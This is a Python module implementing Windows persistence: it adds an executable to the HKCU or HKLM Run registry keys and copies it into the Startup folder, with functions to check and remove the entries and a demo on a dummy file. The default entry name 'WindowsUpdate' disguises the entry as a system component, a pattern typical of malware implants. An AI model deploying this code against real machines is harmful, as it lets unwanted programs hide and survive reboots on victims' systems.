#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import winreg
import shutil
import logging
from typing import Optional, Tuple, Dict, List

class Persistence:
    """System persistence and startup management"""
    
    def __init__(self, startup_name: str = 'WindowsUpdate'):
        """Initialize persistence manager
        
        Args:
            startup_name (str): Name to use for persistence entries (default: 'WindowsUpdate')
        """
        self.startup_name = startup_name
        self.startup_paths = {
            'HKCU': (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run'),
            'HKLM': (winreg.HKEY_LOCAL_MACHINE, r'Software\Microsoft\Windows\CurrentVersion\Run'),
            'folder': os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        }
    
    def add_to_registry(self, hive: int, key_path: str, executable_path: str) -> bool:
        """Add program to registry startup
        
        Args:
            hive: Registry hive (HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE)
            key_path: Registry key path
            executable_path: Path to executable
            
        Returns:
            bool: True if successful
        """
        try:
            if not os.path.exists(executable_path):
                logging.error(f"Executable does not exist: {executable_path}")
                return False
                
            key = winreg.CreateKeyEx(
                hive,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, self.startup_name, 0, winreg.REG_SZ, executable_path)
            winreg.CloseKey(key)
            logging.info(f"Added to registry ({key_path}): {executable_path}")
            return True
        except PermissionError:
            logging.error(f"Permission denied adding to registry: {key_path}")
            return False
        except Exception as e:
            logging.error(f"Error adding to registry {key_path}: {str(e)}")
            return False
    
    def remove_from_registry(self, hive: int, key_path: str) -> bool:
        """Remove program from registry startup
        
        Args:
            hive: Registry hive (HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE)
            key_path: Registry key path
            
        Returns:
            bool: True if successful or entry didn't exist
        """
        try:
            key = winreg.OpenKeyEx(
                hive,
                key_path,
                0,
                winreg.KEY_ALL_ACCESS
            )
            try:
                winreg.DeleteValue(key, self.startup_name)
                logging.info(f"Removed from registry: {key_path}")
            except FileNotFoundError:
                pass  # Value doesn't exist, consider it success
            winreg.CloseKey(key)
            return True
        except PermissionError:
            logging.error(f"Permission denied removing from registry: {key_path}")
            return False
        except FileNotFoundError:
            return True  # Key doesn't exist, consider it success
        except Exception as e:
            logging.error(f"Error removing from registry {key_path}: {str(e)}")
            return False
    
    def add_to_startup_folder(self, executable_path: str) -> bool:
        """Add program to startup folder
        
        Args:
            executable_path: Path to executable
            
        Returns:
            bool: True if successful
        """
        try:
            if not os.path.exists(executable_path):
                logging.error(f"Executable does not exist: {executable_path}")
                return False
                
            os.makedirs(self.startup_paths['folder'], exist_ok=True)
            startup_file = os.path.join(self.startup_paths['folder'], f"{self.startup_name}.exe")
            shutil.copy2(executable_path, startup_file)
            logging.info(f"Added to startup folder: {startup_file}")
            return True
        except PermissionError:
            logging.error("Permission denied adding to startup folder")
            return False
        except Exception as e:
            logging.error(f"Error adding to startup folder: {str(e)}")
            return False
    
    def remove_from_startup_folder(self) -> bool:
        """Remove program from startup folder
        
        Returns:
            bool: True if successful or file didn't exist
        """
        try:
            startup_file = os.path.join(self.startup_paths['folder'], f"{self.startup_name}.exe")
            if os.path.exists(startup_file):
                os.remove(startup_file)
                logging.info(f"Removed from startup folder: {startup_file}")
            return True
        except PermissionError:
            logging.error("Permission denied removing from startup folder")
            return False
        except Exception as e:
            logging.error(f"Error removing from startup folder: {str(e)}")
            return False
    
    def check_persistence(self) -> Dict[str, bool]:
        """Check current persistence status
        
        Returns:
            dict: Persistence status for each method
        """
        status = {
            'registry_HKCU': False,
            'registry_HKLM': False,
            'startup_folder': False
        }
        
        try:
            # Check HKCU
            key = winreg.OpenKeyEx(
                self.startup_paths['HKCU'][0],
                self.startup_paths['HKCU'][1],
                0,
                winreg.KEY_READ
            )
            try:
                winreg.QueryValueEx(key, self.startup_name)
                status['registry_HKCU'] = True
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
            
            # Check HKLM (requires admin rights)
            try:
                key = winreg.OpenKeyEx(
                    self.startup_paths['HKLM'][0],
                    self.startup_paths['HKLM'][1],
                    0,
                    winreg.KEY_READ
                )
                try:
                    winreg.QueryValueEx(key, self.startup_name)
                    status['registry_HKLM'] = True
                except FileNotFoundError:
                    pass
                winreg.CloseKey(key)
            except PermissionError:
                pass
            
            # Check startup folder
            startup_file = os.path.join(self.startup_paths['folder'], f"{self.startup_name}.exe")
            status['startup_folder'] = os.path.exists(startup_file)
            
        except Exception as e:
            logging.error(f"Error checking persistence: {str(e)}")
        
        return status
    
    def add_persistence(self, executable_path: str, methods: List[str] = ['HKCU', 'folder']) -> Dict[str, bool]:
        """Add persistence using specified methods
        
        Args:
            executable_path: Path to executable
            methods: List of persistence methods to use ('HKCU', 'HKLM', 'folder')
            
        Returns:
            dict: Status of each method
        """
        results = {}
        
        if not os.path.isabs(executable_path):
            executable_path = os.path.abspath(executable_path)
        
        if 'HKCU' in methods:
            results['HKCU'] = self.add_to_registry(
                self.startup_paths['HKCU'][0],
                self.startup_paths['HKCU'][1],
                executable_path
            )
        
        if 'HKLM' in methods:
            results['HKLM'] = self.add_to_registry(
                self.startup_paths['HKLM'][0],
                self.startup_paths['HKLM'][1],
                executable_path
            )
        
        if 'folder' in methods:
            results['folder'] = self.add_to_startup_folder(executable_path)
        
        return results
    
    def remove_persistence(self, methods: List[str] = ['HKCU', 'folder']) -> Dict[str, bool]:
        """Remove persistence for specified methods
        
        Args:
            methods: List of persistence methods to remove ('HKCU', 'HKLM', 'folder')
            
        Returns:
            dict: Status of each method
        """
        results = {}
        
        if 'HKCU' in methods:
            results['HKCU'] = self.remove_from_registry(
                self.startup_paths['HKCU'][0],
                self.startup_paths['HKCU'][1]
            )
        
        if 'HKLM' in methods:
            results['HKLM'] = self.remove_from_registry(
                self.startup_paths['HKLM'][0],
                self.startup_paths['HKLM'][1]
            )
        
        if 'folder' in methods:
            results['folder'] = self.remove_from_startup_folder()
        
        return results

if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Example usage
    persistence = Persistence("TestApp")
    test_exe = os.path.join(os.getcwd(), "test.exe")
    
    # Create a dummy executable for testing
    if not os.path.exists(test_exe):
        with open(test_exe, 'w') as f:
            f.write("dummy content")
    
    # Add persistence
    add_results = persistence.add_persistence(test_exe, ['HKCU', 'folder'])
    print("Add Persistence Results:", add_results)
    
    # Check status
    status = persistence.check_persistence()
    print("Persistence Status:", status)
    
    # Remove persistence
    remove_results = persistence.remove_persistence(['HKCU', 'folder'])
    print("Remove Persistence Results:", remove_results)
    
    # Clean up
    if os.path.exists(test_exe):
        os.remove(test_exe)